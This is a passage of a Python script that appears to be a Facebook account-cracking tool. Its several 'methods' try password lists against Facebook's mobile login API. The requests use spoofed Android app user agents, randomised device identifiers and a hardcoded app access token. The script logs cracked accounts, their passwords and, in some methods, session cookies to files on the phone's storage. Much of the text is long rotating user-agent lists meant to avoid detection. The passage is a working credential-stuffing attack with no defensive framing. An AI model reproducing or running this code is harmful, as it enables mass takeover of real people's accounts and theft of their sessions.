SE;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D722;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454115;FBDM/{density=2.0,width=1280,height=720};FBLC/es_LA;FBCR/Claro;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J500M;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454115;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/vodafone UK;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5803;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454115;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/airtel;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/MotoG3;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454115;FBDM/{density=2.0,width=720,height=1184};FBLC/es_LA;FBCR/TELCEL;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1032;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454115;FBDM/{density=2.0,width=720,height=1200};FBLC/en_US;FBCR/MetroPCS;FBMF/LGE;FBBD/MetroPCS;FBPN/com.facebook.katana;FBDV/LGMS631;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454115;FBDM/{density=2.0,width=720,height=1280};FBLC/vi_VN;FBCR/VN VINAPHONE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J500H;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/Verizon Wireless;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/VS980 4G;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/airtel;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1092;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1776};FBLC/es_LA;FBCR/Claro;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI RIO-L03;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/Vodafone IN;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A800F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/AT&-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-G900A;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SCH-I545;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SM-G900V;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_ES;FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1920};FBLC/sv_SE;FBCR/Tele2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1920,height=1080};FBLC/ar_AR;FBCR/ASIACELL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9500;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=4.0,width=1440,height=2392};FBLC/en_US;FBCR/;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/VS986;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=4.0,width=1440,height=2392};FBLC/en_US;FBCR/Verizon Wireless;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/VS985 4G;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454151;FBDM/{density=1.0,width=1024,height=552};FBLC/en_US;FBCR/;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/K01A;FBSV/5.0;nullFBCA/x86:armeabi-v7a;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748049;FBDM/{density=1.0,width=1024,height=552};FBLC/en_GB;FBCR/;FBMF/Lenovo;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Tab2A7-10F;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748049;FBDM/{density=1.0,width=1024,height=552};FBLC/fr_FR;FBCR/;FBMF/Gigabyte;FBBD/RCA;FBPN/com.facebook.katana;FBDV/RCT6773W22;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748049;FBDM/{density=1.0,width=1024,height=720};FBLC/es_ES;FBCR/;FBMF/rockchip;FBBD/rk30sdk;FBPN/com.facebook.katana;FBDV/NBX-T8014;FBSV/4.2.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748049;FBDM/{density=1.0,width=1280,height=752};FBLC/fr_CA;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-N8010;FBSV/4.1.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748049;FBDM/{density=1.0,width=600,height=1024};FBLC/hu_HU;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T113;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748049;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]'])
                        ua = dvl+ ck
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':uas,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;34m [NOYON-OK] \033[1;32m'+ids+'\n \033[1;34mUID | PASS : \033[1;32m'+str(uid)+' | '+pas+'\033[1;97m')
                                        #coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\033[1;34mCOOKIE:\033[1;32m "+coki+ '\n')
                                        #open('/sdcard/TRT-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+ '\n' )
                                        open('/sdcard/TRT-rnd-OK.txt','a').write(str(ids)+'|'+str(uid)+'|'+pas+'\n')
                                        open('/sdcard/TRT-ua.txt','a').write(str(uid)+'|'+pas+ ' | ' +usk+ '\n' )
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\033[1;34m [NOYON-CP] \033[1;31m'+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TRT-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(uid))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#method4
def trt4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [TRT-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Dalvik/2.1.0 (Linux; U; Android 5.0.2; SGH-M919 Build/LRX22G) [FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-M919;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [TRT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/TRT-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/TRT-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[38;5;205m [TRT-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TRT-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#method5
def trt5(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [TRT-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=2246};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [TRT-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TRT-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[38;5;205m [TRT-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TRT-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#method6
def trt6(ids,passlist):
	global loop
	global oks
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;37m [TRT-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
			ua = random.choice(['Mozilla/5.0 (Linux; U; Android 4.4; SM-G900W8 Build/KOT49H) AppleWebKit/603.21 (KHTML, like Gecko)  Chrome/48.0.2228.158 Mobile Safari/537.7','Mozilla/5.0 (Linux; U; Android 4.4.4; LG-D955 Build/KOT49I) AppleWebKit/600.6 (KHTML, like Gecko)  Chrome/48.0.3550.119 Mobile Safari/601.1','Mozilla/5.0 (Android; Android 6.0.1; HTC One M9 Build/MRA58K) AppleWebKit/600.8 (KHTML, like Gecko)  Chrome/55.0.2531.367 Mobile Safari/603.1','Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MDB08L) AppleWebKit/603.43 (KHTML, like Gecko)  Chrome/54.0.2339.227 Mobile Safari/533.1','Mozilla/5.0 (Android; Android 5.1; MOTO XT1570 MOTO X STYLE Build/LPD23) AppleWebKit/602.33 (KHTML, like Gecko)  Chrome/50.0.3836.393 Mobile Safari/534.7','Mozilla/5.0 (Linux; Android 6.0.1; HTC One_M8 dual sim Build/MRA58K) AppleWebKit/537.46 (KHTML, like Gecko)  Chrome/51.0.2981.260 Mobile Safari/602.5','Mozilla/5.0 (Linux; Android 4.3.1; SM-G340A Build/JLS36C) AppleWebKit/600.50 (KHTML, like Gecko)  Chrome/54.0.3588.294 Mobile Safari/603.2','Mozilla/5.0 (Linux; Android 7.1; Pixel XL Build/NME91E) AppleWebKit/537.35 (KHTML, like Gecko)  Chrome/51.0.2321.177 Mobile Safari/535.6','Mozilla/5.0 (Android; Android 5.0.1; Lenovo A7000-a Build/LRX21M;) AppleWebKit/537.1 (KHTML, like Gecko)  Chrome/52.0.3432.398 Mobile Safari/603.3','Mozilla/5.0 (Linux; Android 7.1; Pixel XL Build/NME91E) AppleWebKit/601.29 (KHTML, like Gecko)  Chrome/50.0.2227.370 Mobile Safari/535.8','Mozilla/5.0 (Linux; U; Android 7.0; SAMSUNG GT-I9500 Build/KTU84P) AppleWebKit/603.48 (KHTML, like Gecko)  Chrome/54.0.1339.191 Mobile Safari/537.9','Mozilla/5.0 (Linux; Android 5.1; SAMSUNG SM-G935M Build/MMB29M) AppleWebKit/536.49 (KHTML, like Gecko)  Chrome/50.0.1026.311 Mobile Safari/533.3','Mozilla/5.0 (Linux; Android 7.0; Xperia Build/NDE63X) AppleWebKit/601.36 (KHTML, like Gecko)  Chrome/53.0.3237.150 Mobile Safari/536.4','Mozilla/5.0 (Linux; Android 4.3.1; HTC One 801s Build/JSS15J) AppleWebKit/533.43 (KHTML, like Gecko)  Chrome/55.0.1473.380 Mobile Safari/603.5','Mozilla/5.0 (Android; Android 5.0; LG-D953P Build/LRX22G) AppleWebKit/600.18 (KHTML, like Gecko)  Chrome/48.0.2556.180 Mobile Safari/603.4','Mozilla/5.0 (Linux; Android 7.1.1; LG-H900 Build/NRD90M) AppleWebKit/537.38 (KHTML, like Gecko)  Chrome/55.0.3210.129 Mobile Safari/533.8','Mozilla/5.0 (Linux; U; Android 4.3.1; SAMSUNG SM-G330A Build/JLS36C) AppleWebKit/535.47 (KHTML, like Gecko)  Chrome/49.0.1281.332 Mobile Safari/537.0','Mozilla/5.0 (Android; Android 5.1; MOTO X PURE XT1575 Build/LXB22) AppleWebKit/603.1 (KHTML, like Gecko)  Chrome/52.0.1115.118 Mobile Safari/600.7','Mozilla/5.0 (Android; Android 5.0.1; LG-G834I Build/LMY47X) AppleWebKit/600.45 (KHTML, like Gecko)  Chrome/54.0.1253.287 Mobile Safari/534.7','Mozilla/5.0 (Android; Android 5.0; LG-D728 Build/LRX22G) AppleWebKit/601.45 (KHTML, like Gecko)  Chrome/53.0.3684.397 Mobile Safari/535.9','Mozilla/5.0 (Linux; Android 4.3.1; HTC One max Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko)  Chrome/48.0.2010.388 Mobile Safari/533.6','Mozilla/5.0 (Android; Android 4.4.4; Nexus S 4G Build/GRJ22) AppleWebKit/533.41 (KHTML, like Gecko)  Chrome/53.0.2812.331 Mobile Safari/537.7','Mozilla/5.0 (Linux; U; Android 5.0; HTC 80:number1-2w Build/JSS15J) AppleWebKit/603.28 (KHTML, like Gecko)  Chrome/52.0.2713.274 Mobile Safari/536.4','Mozilla/5.0 (Linux; Android 4.4; SM-G900T Build/KOT49H) AppleWebKit/537.4 (KHTML, like Gecko)  Chrome/51.0.1593.389 Mobile Safari/533.7','Mozilla/5.0 (Android; Android 5.0; LG-D728 Build/LRX22G) AppleWebKit/537.23 (KHTML, like Gecko)  Chrome/53.0.3824.137 Mobile Safari/603.1','Mozilla/5.0 (Linux; U; Android 7.0; LG-H930 Build/NRD90M) AppleWebKit/537.18 (KHTML, like Gecko)  Chrome/49.0.1868.290 Mobile Safari/601.7','Mozilla/5.0 (Linux; Android 4.3.1; HTC Xplorer A320s Build/GRJ90) AppleWebKit/603.47 (KHTML, like Gecko)  Chrome/48.0.2905.247 Mobile Safari/536.1','Mozilla/5.0 (Linux; Android 4.4; E:number:20-23:33 Build/24.0.A.1.34) AppleWebKit/534.50 (KHTML, like Gecko)  Chrome/49.0.3106.204 Mobile Safari/536.1','Mozilla/5.0 (Linux; Android 4.4; SAMSUNG SM-N8010 Build/JZO54K) AppleWebKit/601.1 (KHTML, like Gecko)  Chrome/53.0.3102.229 Mobile Safari/602.3','Mozilla/5.0 (Android; Android 4.4; LG-D953 Build/KOT49I) AppleWebKit/602.9 (KHTML, like Gecko)  Chrome/51.0.2934.164 Mobile Safari/534.3','Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SM-G450 Build/LRX22G) AppleWebKit/535.18 (KHTML, like Gecko)  Chrome/54.0.2804.393 Mobile Safari/602.9','Mozilla/5.0 (Linux; U; Android 4.4; SM-J200F Build/KTU84P) AppleWebKit/536.9 (KHTML, like Gecko)  Chrome/47.0.3303.227 Mobile Safari/603.5','Mozilla/5.0 (Linux; U; Android 7.0; Xperia V Build/NDE63X) AppleWebKit/600.5 (KHTML, like Gecko)  Chrome/53.0.2818.363 Mobile Safari/537.4','Mozilla/5.0 (Linux; U; Android 6.0.1; Nexus 5X Build/MMB29K) AppleWebKit/600.12 (KHTML, like Gecko)  Chrome/51.0.2288.378 Mobile Safari/601.5','Mozilla/5.0 (Linux; Android 7.0; Pixel XL Build/NME91E) AppleWebKit/602.17 (KHTML, like Gecko)  Chrome/51.0.3697.295 Mobile Safari/600.7','Mozilla/5.0 (Android; Android 4.4.4; SM-J110F Build/KTU84P) AppleWebKit/600.32 (KHTML, like Gecko)  Chrome/53.0.2219.159 Mobile Safari/600.0','Mozilla/5.0 (Linux; Android 7.0; Pixel XL Build/NRD90M) AppleWebKit/535.41 (KHTML, like Gecko)  Chrome/50.0.2409.209 Mobile Safari/535.9','Mozilla/5.0 (Android; Android 7.1; Nexus 5X Build/NPD90G) AppleWebKit/535.2 (KHTML, like Gecko)  Chrome/53.0.2442.258 Mobile Safari/602.1','Mozilla/5.0 (Linux; U; Android 5.0.1; HTC [M8|M9|M8 Pro Build/LRX22G) AppleWebKit/602.3 (KHTML, like Gecko)  Chrome/55.0.3837.323 Mobile Safari/603.6','Mozilla/5.0 (Android; Android 5.1; Nexus 9 Build/LRX22C) AppleWebKit/534.19 (KHTML, like Gecko)  Chrome/50.0.2025.216 Mobile Safari/536.2','Mozilla/5.0 (Linux; U; Android 7.0; GT-I9600 Build/KTU84P) AppleWebKit/536.19 (KHTML, like Gecko)  Chrome/48.0.3939.312 Mobile Safari/534.7','Mozilla/5.0 (Android; Android 4.4.4; MOTOROLA MSM8960 Build/KVT49L) AppleWebKit/603.26 (KHTML, like Gecko)  Chrome/48.0.1200.119 Mobile Safari/534.8','Mozilla/5.0 (Linux; Android 5.1.1; SM-G935T Build/MMB29M) AppleWebKit/603.46 (KHTML, like Gecko)  Chrome/47.0.2755.171 Mobile Safari/536.2','Mozilla/5.0 (Linux; U; Android 5.1.1; Nexus 5 Build/LMY48B) AppleWebKit/533.10 (KHTML, like Gecko)  Chrome/50.0.3673.158 Mobile Safari/536.7','Mozilla/5.0 (Linux; Android 6.0; HTC One_M9 Build/MRA58K) AppleWebKit/600.45 (KHTML, like Gecko)  Chrome/48.0.1383.265 Mobile Safari/534.9','Mozilla/5.0 (Android; Android 4.4.4; LG-F500K Build/KOT49I) AppleWebKit/603.2 (KHTML, like Gecko)  Chrome/54.0.1457.152 Mobile Safari/534.7','Mozilla/5.0 (Linux; Android 5.0; HTC Butterfly S 919d Build/LRX22G) AppleWebKit/537.26 (KHTML, like Gecko)  Chrome/52.0.3553.400 Mobile Safari/600.1','Mozilla/5.0 (Linux; Android 5.1.1; MOTO G XT1068 Build/LPD23) AppleWebKit/600.18 (KHTML, like Gecko)  Chrome/47.0.3055.223 Mobile Safari/601.6','Mozilla/5.0 (Android; Android 5.1.1; SM-G935M Build/LMY47X) AppleWebKit/600.38 (KHTML, like Gecko)  Chrome/52.0.1781.337 Mobile Safari/535.9','Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SM-G470 Build/LRX22C) AppleWebKit/601.40 (KHTML, like Gecko)  Chrome/55.0.2322.390 Mobile Safari/533.5','Mozilla/5.0 (Linux; U; Android 4.4.1; Elephone P5000 Build/KTU84P) AppleWebKit/603.41 (KHTML, like Gecko)  Chrome/50.0.1843.275 Mobile Safari/537.8','Mozilla/5.0 (Android; Android 4.3.1; HUAWEI G6-L10 Build/HuaweiG6-L11) AppleWebKit/603.30 (KHTML, like Gecko)  Chrome/52.0.1388.240 Mobile Safari/535.4','Mozilla/5.0 (Linux; U; Android 7.1.1; GT-I9700 Build/KTU84P) AppleWebKit/533.13 (KHTML, like Gecko)  Chrome/48.0.1119.166 Mobile Safari/537.0','Mozilla/5.0 (Linux; Android 5.1.1; Nexus 7 Build/LMY48B) AppleWebKit/600.50 (KHTML, like Gecko)  Chrome/55.0.3383.277 Mobile Safari/535.3','Mozilla/5.0 (Linux; Android 5.1.1; SM-G925M Build/LMY47X) AppleWebKit/537.30 (KHTML, like Gecko)  Chrome/55.0.1419.387 Mobile Safari/603.2','Mozilla/5.0 (Android; Android 5.1; Nexus 6 Build/LRX22C) AppleWebKit/600.30 (KHTML, like Gecko)  Chrome/51.0.2174.378 Mobile Safari/600.2','Mozilla/5.0 (Android; Android 5.0.2; LG-D701 Build/LRX22G) AppleWebKit/602.49 (KHTML, like Gecko)  Chrome/51.0.2866.378 Mobile Safari/601.6','Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G410 Build/LRX22C) AppleWebKit/601.21 (KHTML, like Gecko)  Chrome/51.0.1774.303 Mobile Safari/600.3','Mozilla/5.0 (Android; Android 4.3.1; GT-I9200 Build/JDQ39) AppleWebKit/536.1 (KHTML, like Gecko)  Chrome/53.0.2941.308 Mobile Safari/602.0','Mozilla/5.0 (Linux; U; Android 4.3.1; SAMSUNG SM-G3589V Build/JLS36C) AppleWebKit/536.6 (KHTML, like Gecko)  Chrome/48.0.3860.358 Mobile Safari/534.0','Mozilla/5.0 (Linux; U; Android 4.4; HTC OneS dual sim Build/KTU84L) AppleWebKit/534.37 (KHTML, like Gecko)  Chrome/47.0.1363.160 Mobile Safari/536.5','Mozilla/5.0 (Linux; U; Android 5.0.1; HTC [M8|M9|M8 Pro Build/LRX22G) AppleWebKit/533.8 (KHTML, like Gecko)  Chrome/55.0.2547.227 Mobile Safari/533.6','Mozilla/5.0 (Linux; U; Android 4.3.1; SAMSUNG SM-T245v Build/JSS15J) AppleWebKit/535.1 (KHTML, like Gecko)  Chrome/54.0.2960.307 Mobile Safari/534.9','Mozilla/5.0 (Android; Android 5.1.1; Nexus 8 Build/LRX22C) AppleWebKit/537.47 (KHTML, like Gecko)  Chrome/54.0.2220.369 Mobile Safari/534.4','Mozilla/5.0 (Android; Android 4.4.1; Nexus5 V6.1 Build/KOT49H) AppleWebKit/602.9 (KHTML, like Gecko)  